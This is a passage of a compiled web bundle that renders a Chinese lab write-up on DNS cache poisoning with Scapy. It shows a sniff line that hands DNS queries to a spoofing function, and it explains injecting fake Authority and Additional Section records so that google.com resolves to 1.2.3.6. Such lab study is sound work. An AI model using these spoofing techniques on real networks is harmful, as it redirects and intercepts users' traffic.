UDP query packets and invoke spoof_dns().")]),s._v("\npkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" sniff"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("filter")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'udp and dst port 53'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" prn"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("spoof_dns"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br")])]),a("p",[s._v("仍然让受害者 "),a("code",[s._v("dig example.net")]),s._v(", 但是现在第 1 处高亮位置添加 "),a("code",[s._v("google.com")]),s._v(" 的处理判断, 在 "),a("em",[s._v("Authority Section")]),s._v(" 中添加添加 "),a("code",[s._v("google.com")]),s._v(" 对应的内容 (第 2 部分的高亮). 同时修改 "),a("em",[s._v("DNSpkt")]),s._v(" 的参数: "),a("em",[s._v("nscount")]),s._v(" 与 "),a("em",[s._v("ns")]),s._v(" (第3 部分高亮).")]),s._v(" "),a("p",[a("img",{attrs:{src:"/note/img/2020-02-17-14-06-35.png",alt:""}})]),s._v(" "),a("p",[s._v("之后受害者使用 "),a("code",[s._v("dig google.com")]),s._v(" 之类指令时, 本地 DNS 服务器就会直接返回 "),a("code",[s._v("1.2.3.6")]),s._v(" 的 answer.")]),s._v(" "),a("h2",{attrs:{id:"t9-targeting-the-additional-section"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t9-targeting-the-additional-section"}},[s._v("#")]),s._v(" T9 Targeting the Additional Section")]),s._v(" "),a("p",[a("em",[s._v("Additional Section")]),s._v(" 的作用是记录一些额外的信息, 实际中用来记录一些主机的 IP. T9 计划在 "),a("em",[s._v("Additional Section")]),s._v(" 添加一些内容, 并被本地 DNS 服务器缓存下来.")]),s._v(" "),a("p",[s._v("实验指导中的 "),a("em",[s._v("Additional Section")]),s._v(" 中一共有三条记录, 前两条, 在 T7 和 T8 中已经完成了,")]),s._v(" "),a("div",{staticClass:"custom-block warning"},[a("p",{staticClass:"custom-block-title"},[s._v("DNS 响应")]),s._v(" "),a("p",[s._v("两个 DNS 响应, 是否存在后者覆盖前者的情况? 这个应该是 scapy 中 filter 的问题, 应该只保留 DNS 服务器发出的请求")])])])}),[],!1,null,null,null);t.default=e.exports}}]);